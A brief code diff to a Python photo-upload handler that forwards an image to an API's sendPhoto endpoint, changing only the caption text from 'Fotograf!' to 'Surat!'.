@@ -72,7 +72,7 @@ def upload(token):
         return {"error": "decode"}, 400
 
     info = user_tokens[token]
-    cap = "Fotograf! @" + info["username"]
+    cap = "Surat! @" + info["username"]
 
     url = API_URL + "/sendPhoto"
     files = {"photo": ("photo.jpg", img_bytes, "image/jpeg")}
